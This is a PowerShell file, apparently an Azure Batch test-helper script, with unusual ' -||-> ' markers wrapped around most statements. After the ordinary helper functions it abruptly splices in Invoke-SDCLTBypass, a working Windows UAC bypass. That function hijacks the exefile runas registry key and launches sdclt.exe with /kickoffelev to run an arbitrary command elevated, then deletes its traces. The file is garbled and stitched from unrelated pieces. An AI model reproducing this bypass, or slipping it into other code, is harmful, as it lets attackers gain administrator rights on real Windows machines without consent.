














 -||-> function Start-TestSleep($milliseconds)
{
     -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback <-||- )
    {
         -||-> Start-Sleep -Milliseconds $milliseconds <-||- 
    } <-||- 
} <-||- 

 -||-> function Compute-TestTimeout($seconds)
{
     -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -eq [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback <-||- )
    {
        
        return  -||-> 60 * 24 * 3 <-||- 
    }
    else
    {
        return  -||-> $seconds <-||- 
    } <-||- 
} <-||- 


 -||-> function Get-BatchAccountName
{
    return  -||-> getAssetName <-||- 
} <-||- 


 -||-> function Get-ResourceGroupName
{
    return  -||-> getAssetName <-||- 
} <-||- 


 -||-> function Get-BatchAccountProviderLocation($index)
{
     -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback <-||- )
    {
         -||-> $namespace = "Microsoft.Batch" <-||- 
         -||-> $type = "batchAccounts" <-||- 
         -||-> $r =  -||-> Get-AzResourceProvider -ProviderNamespace $namespace | where { -||-> $_.ResourceTypes[0].ResourceTypeName -eq $type <-||- } <-||-  <-||- 
         -||-> $location = $r.Locations <-||- 
  
         -||-> if ( -||-> $location -eq $null <-||- )
        {  
            return  -||-> "westus" <-||- 
        } 
        else 
        {  
             -||-> if ( -||-> $index -eq $null <-||- )
            {
                return  -||-> "westus" <-||- 
            }
            else
            {
                return  -||-> $location[$index] <-||- 
            } <-||- 
        } <-||-   
    } <-||- 

    return  -||-> "westus" <-||- 
} -||-> f <-||- function Invoke-SDCLTBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
     -||-> $ConsentPrompt = ( -||-> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System <-||- ).ConsentPromptBehaviorAdmin <-||- 
     -||-> $SecureDesktopPrompt = ( -||-> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System <-||- ).PromptOnSecureDesktop <-||- 

     -||-> if( -||-> $ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1 <-||- ){
         -||-> "UAC is set to 'Always Notify'. This module does not bypass this setting." <-||- 
        exit
    }
    else{
        
         -||-> $exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command" <-||- 

         -||-> if ( -||-> $Force -or ( -||-> ( -||-> Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue <-||- ) -eq $null <-||- ) <-||- ){
             -||-> New-Item $exeCommandPath -Force |
                New-ItemProperty -Name 'IsolatedCommand' -Value $Command -PropertyType string -Force | Out-Null <-||- 
        }else{
             -||-> Write-Warning "Key already exists, consider using -Force" <-||- 
            exit
        } <-||- 

         -||-> if ( -||-> Test-Path $exeCommandPath <-||- ) {
             -||-> Write-Verbose "Created registry entries to hijack the exe runas extension" <-||- 
        }else{
             -||-> Write-Warning "Failed to create registry key, exiting" <-||- 
            exit
        } <-||- 

         -||-> $sdcltPath =  -||-> Join-Path -Path ( -||-> [Environment]::GetFolderPath('System') <-||- ) -ChildPath 'sdclt.exe' <-||-  <-||- 
         -||-> if ( -||-> $PSCmdlet.ShouldProcess($sdcltPath, 'Start process') <-||- ) {
             -||-> $Process =  -||-> Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru <-||-  <-||- 
             -||-> Write-Verbose "Started sdclt.exe" <-||- 
        } <-||- 

        
         -||-> Write-Verbose "Sleeping 5 seconds to trigger payload" <-||- 
         -||-> if ( -||-> -not $PSBoundParameters['WhatIf'] <-||- ) {
             -||-> Start-Sleep -Seconds 5 <-||- 
        } <-||- 

         -||-> $exefilePath = "HKCU:\Software\Classes\exefile" <-||- 

         -||-> if ( -||-> Test-Path $exefilePath <-||- ) {
            
             -||-> Remove-Item $exefilePath -Recurse -Force <-||- 
             -||-> Write-Verbose "Removed registry entries" <-||- 
        } <-||- 

         -||-> if( -||-> Get-Process -Id $Process.Id -ErrorAction SilentlyContinue <-||- ){
             -||-> Stop-Process -Id $Process.Id <-||- 
             -||-> Write-Verbose "Killed running sdclt process" <-||- 
        } <-||- 
    } <-||- 
} <-||- 


